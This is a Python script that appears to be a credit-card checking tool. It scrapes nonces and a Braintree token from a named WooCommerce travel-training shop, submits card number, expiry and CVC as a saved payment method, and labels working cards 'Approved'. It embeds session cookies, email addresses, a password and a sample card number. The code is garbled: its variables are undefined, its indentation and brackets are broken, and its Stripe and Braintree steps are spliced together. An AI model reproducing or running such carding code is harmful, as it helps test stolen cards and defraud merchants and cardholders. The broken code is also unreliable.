import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''hxhcdrr%7C1713641609%7CXOJGK2xFYyXD6Wom3p2Cujj2ZkzyHqXGk13kFuIl5z2%7Cedf540bbe280f3cab93eebcbdb30556e244f9cbfd6b72021d7ea61d6330bc024
jsnxuwv%7C1713641702%7CLuntNS8UCY3lTvN6Yq0pXDIWhRoQN6T2rIJcVUYHqrW%7C81172a53f2d4f6da23bb1b177581990c34ac15331baad10c4d3bad3500cd0559
bdjqisha%7C1713641764%7C6XL7TRIFD9CrHleBLzzCSt7ymVS4pAGUu5mYFW0s5XN%7C84adb5191193048c127086078a87c34bcf50e586791ccd976e5dd088b037346b
djdnsbba%7C1713641897%7CL5FleSTWtIImxvKpB3JvEdk09qZLTGEPUaxNadcBsno%7C7ebd4c043b84acda974813d5eaf330f62d91fad75f7ee3d0300f06abc52bcaf4'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
	    'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa00077@gmail.com; mailchimp_user_email=rokynoa00077%40gmail.com; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731839322.43.0.0',
	}
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
	    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa00077@gmail.com; mailchimp_user_email=rokynoa00077%40gmail.com; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731839322.43.0.0',
	    'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
	}
	
	response = requests.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	headers = {
	    'authority': 'www.thetravelinstitute.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.thetravelinstitute.com',
        'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
}

            data = {
    'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': iddd,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': nonce,
}
	
	response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data,timeout=20)
            res = (response.json())['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
	    'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa00077@gmail.com; mailchimp_user_email=rokynoa00077%40gmail.com; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731839322.43.0.0',
	}
	
	headers = {
	    'authority': 'www.thetravelinstitute.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731840062.56.0.0; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; mailchimp.cart.previous_email=rokynoa00077@gmail.com; mailchimp.cart.current_email=rokynoa70@gmail.com; mailchimp_user_previous_email=rokynoa70%40gmail.com; mailchimp_user_email=rokynoa70%40gmail.com',
    'origin': 'https://www.thetravelinstitute.com',
    'referer': 'https://www.thetravelinstitute.com/register/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = [
    ('afurd_field_nonce', f'{nonce}'),
    ('_wp_http_referer', '/register/'),
    ('pre_page', ''),
    ('email', f'{email}'),
    ('password', 'Esahatam2009@'),
    ('wc_order_attribution_source_type', 'typein'),
    ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
    ('wc_order_attribution_utm_campaign', '(none)'),
    ('wc_order_attribution_utm_source', '(direct)'),
    ('wc_order_attribution_utm_medium', '(none)'),
    ('wc_order_attribution_utm_content', '(none)'),
    ('wc_order_attribution_utm_id', '(none)'),
    ('wc_order_attribution_utm_term', '(none)'),
    ('wc_order_attribution_utm_source_platform', '(none)'),
    ('wc_order_attribution_utm_creative_format', '(none)'),
    ('wc_order_attribution_utm_marketing_tactic', '(none)'),
    ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
    ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
    ('wc_order_attribution_session_pages', '8'),
    ('wc_order_attribution_session_count', '1'),
    ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
    ('woocommerce-register-nonce', f'{noncee}'),
    ('_wp_http_referer', '/register/'),
    ('register', 'Register'),
	}
	
	response = requests.post(
	    'https://www.thetravelinstitute.com/my-account/payment-methods/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def sq(card):
	return 'ابقي غطيها كويس لما تيجي تنام'